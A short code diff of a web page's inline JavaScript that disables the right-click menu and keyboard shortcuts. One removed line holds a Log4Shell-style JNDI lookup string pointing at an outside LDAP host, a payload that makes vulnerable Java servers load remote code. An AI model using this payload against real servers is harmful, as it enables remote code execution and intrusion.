@@ -236,14 +236,10 @@ init();
 
 <script language="javascript"> 
 function Click(){ 
-alert('${jndi:ldap://Shwepsik:1389/a}'); 
 window.event.returnValue=false; 
 } 
-document.oncontextmenu=Click; 
- </script>     
-<script> 
+ document.oncontextmenu=Click; 
  document.onkeydown = function(e) { 
-	if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) { } 
 	return false; 
   }; 
 </script>
